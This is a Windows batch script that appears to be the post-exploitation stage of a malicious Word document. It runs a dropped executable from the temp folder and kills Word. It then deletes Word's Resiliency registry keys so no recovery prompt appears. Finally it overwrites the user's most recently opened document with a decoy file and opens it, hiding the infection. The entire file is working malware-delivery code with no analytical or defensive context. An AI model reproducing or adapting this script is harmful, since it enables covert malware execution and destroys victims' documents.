ECHO OFF 
TIMEOUT 1 


start %userprofile%\appdata\local\temp\ExE.exe



set "App=winword.exe" 
TASKKILL /F /IM %App% 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Resiliency /f 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Word\Resiliency /f 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency /f 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Word\Resiliency /f 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Resiliency /f 

for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\11.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b" 
copy %userprofile%\appdata\local\temp\DeCoY.DoC "%Ra%" 
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\12.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b" 
copy %userprofile%\appdata\local\temp\DeCoY.DoC "%Ra%" 
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b" 
copy %userprofile%\appdata\local\temp\DeCoY.DoC "%Ra%" "
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b" 
copy %userprofile%\appdata\local\temp\DeCoY.DoC "%Ra%" 
for /f "tokens=1* delims=\*" %%a in ('REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Word\File MRU" /v "Item 1"') do set "Ra=%%~b" 
copy %userprofile%\appdata\local\temp\DeCoY.DoC "%Ra%" 
"%Ra%"